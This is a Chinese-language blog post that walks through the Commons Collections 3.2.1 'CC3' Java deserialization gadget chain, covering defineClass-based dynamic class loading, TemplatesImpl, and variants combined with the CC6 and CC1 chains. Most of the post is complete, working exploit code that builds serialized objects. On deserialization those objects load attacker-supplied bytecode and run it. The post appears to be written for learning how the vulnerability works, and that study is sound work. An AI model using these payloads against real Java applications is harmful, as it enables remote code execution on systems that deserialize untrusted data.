---
layout: post
date: 2025-4-16
title: "CommonsCollections-CC3-动态类加载机制-分析"
author: "XinYiSleep"
category: Java
---
<h1 id="n2cgu">一.基础信息</h1>

```java
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

结合cc6不限制版本

堆栈
TemplatesImpl.defineClass
        TemplatesImpl.defineTransletClasses
            TemplatesImpl.getTransletInstance
                TemplatesImpl.newTransformer
                    TrAXFilter.TrAXFilter(构造方法)
                        InstantiateTransformer.transform
                            ChainedTransformer.transform
                                LazyMap.get
                                    TiedMapEntry.getValue
                                        TiedMapEntry.hashCode
                                            HashMap.hash
                                                HashMap.readObject
```
<h1 id="cLHPX">二.动态加载机制</h1>

```
先说一下子cc3的不同之处在于他和我们之前学的不管是cc1还是cc6后面的链不一样了，记得cc6其实用到的是cc1后半部链，
而在cc3中我们用到的是前半部链，这个链子所能解决的问题在于代码中如果禁用Runtime问题等，在学习这个链之前首先得了解java的动态加载机制，
这里我就不详细说了只讲一下为什么和怎么用，感兴趣的小子可以去学习一下，我自己觉得不需要懂特别深，因为这是java底层的基础不是安全的基础，
了解一下怎么玩就可以了(当然了学深更好)，ClassLoader.defineClass 作用是处理传入的字节码，然后转换成 Java 类,我们来讲一下Class.forName,
我们做个实验首先创建一个类在静态方法中执行一个命令当作恶意类(图一),执行之后发现是执行了静态方法的(图二)，再回到defineClass和Class.forName这个都是动态类加载到 JVM 中，
下面我们看一下案例通过反射执行defineClass执行test.class，我们了解到下面的执行过程之后就可以想到的攻击面重写或者调用了defineClass。
```

```java
ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
Class<ClassLoader> classLoaderClass = ClassLoader.class;
Method declaredMethod = classLoaderClass.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
declaredMethod.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("C:\\Users\\xinyi\\Desktop\\java测试\\cc3\\target\\classes\\test.class"));
Class invoke = (Class) declaredMethod.invoke(systemClassLoader, "test", bytes, 0, bytes.length);
//上面只是加载需要newInstance执行。
invoke.newInstance();
```
![](https://xinyisleep.github.io/img/2025/commons-collections3/1.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/2.png)

<h1 id="OigOF">三.TemplatesImpl重写defineClass</h1>

```
我们在TemplatesImpl类的一个静态类找到了重写defineClass，可以看到没有标注作用域默认是 defalut(图一图二)自己类中可以调用，
然后找到defineTransletClasses方法中调用了(图三)，但是到我们的目标需要_bytecodes是恶意的class,接着往上走getTransletInstance(图四)为什么是他呢因为defineClass只是加载，
我们需要执行用到newInstance()，图四确实复合我们的条件，我们在往上找到newTransformer修饰符是public，到这其实这个链的下半部分已经就结束了。

```

![](https://xinyisleep.github.io/img/2025/commons-collections3/3.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/3.5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/4.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/6.png)

```
下面我们构造一下poc,首先捋一下思路
ClassLoader.defineClass<-TemplatesImpl.TransletClassLoader.defineClass<-TemplatesImpl.defineTransletClasses<-TemplatesImpl.getTransletInstance<-
TemplatesImpl.newTransformer
首先newTransformer是public也不需要修改什么，之后getTransletInstance需要修改
_name不能是null(上图图四)，接着到defineTransletClasses修改_bytecodes是恶意的class(上面图三),这里其实忽略了一个问题就是_tfactory(上面图三下面图一)因为没有传入参数直接报错了默认是null,这里的话找一下那个类里面实现了getExternalExtensionsMap，在TransformerFactoryImpl.getExternalExtensionsMap里面实现了(图二)，所以修改_tfactory为TransformerFactoryImpl,最终我们目前的链是下面部分。
```

```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
templates.newTransformer();
```

![](https://xinyisleep.github.io/img/2025/commons-collections3/7.png)

![](https://xinyisleep.github.io/img/2025/commons-collections3/8.png)
<h1 id="LtJs5">四.结合cc6和cc1</h1>

```
cc6和cc1很相似大家还记得InvokerTransformer类吧，cc6和cc1我们传入的是Runtime这里我们直接穿进
newTransformer可以看下面payload(代码一),这里强烈建议大家调试跟一下，其实很好理解new ConstantTransformer(templates) 
就是返回templates类InvokerTransformer就是执行，下面我们把cc6的上半部分链拿出来接上(代码二),在结合一下cc1(代码三)
```
```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
//        templates.newTransformer();
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer", null, null)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(1);
```

```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
//        templates.newTransformer();
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer", null, null)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(1);
HashMap<Object, Object> o = new HashMap<>();
Map decorate = LazyMap.decorate(o, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(o, "123");
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
objectObjectHashMap.put(tiedMapEntry, "456");
Class<?> aClass = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
Field map = aClass.getDeclaredField("map");
map.setAccessible(true);
map.set(tiedMapEntry,decorate);
serialize(objectObjectHashMap);
unserialize("ser.bin");
```

```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
//        templates.newTransformer();
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer", null, null)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(1);
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);
Object proxy = (Map)Proxy.newProxyInstance(objectObjectHashMap.getClass().getClassLoader(), objectObjectHashMap.getClass().getInterfaces(), o);
Object o1 = declaredConstructor.newInstance(Override.class, proxy);
serialize(o1);
unserialize("ser.bin");
```
<h1 id="RVTHq">五.真正的cc3</h1>

```
虽然结合确实可以用但是都不是真正的cc3,下面我们讲一下真正的cc3,我们之前结合就是调用了newTransformer方法就可以导致代码执行，
找一下哪里调用了他，在TrAXFilter构造方法中调用了，很好虽然他没有实现接口Serializable无所谓我们使用反射，
使用cc6再次结合看下面payload(代码一)，可以发现我们并没有使用InvokerTransformer作为反射，而是使用的InstantiateTransformer没错cc3的作者挖了一条另外作为反射的transform方法(图二)直接反射触发构造方法牛逼，
在使用cc1再次进行结合(代码二)，这里还是喜欢cc3和cc6结合因为不限制JDK版本，好了我们下期再见。
```
![](https://xinyisleep.github.io/img/2025/commons-collections3/9.png)

```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
//        templates.newTransformer();
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> o = new HashMap<>();
Map decorate = LazyMap.decorate(o, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(o, "123");
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
objectObjectHashMap.put(tiedMapEntry, "456");
Class<?> aClass = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
Field map = aClass.getDeclaredField("map");
map.setAccessible(true);
map.set(tiedMapEntry,decorate);
serialize(objectObjectHashMap);
unserialize("ser.bin");
```

![](https://xinyisleep.github.io/img/2025/commons-collections3/10.png)

```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
//        templates.newTransformer();
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);
Object proxy = (Map)Proxy.newProxyInstance(objectObjectHashMap.getClass().getClassLoader(), objectObjectHashMap.getClass().getInterfaces(), o);
Object o1 = declaredConstructor.newInstance(Override.class, proxy);
serialize(o1);
unserialize("ser.bin");
```

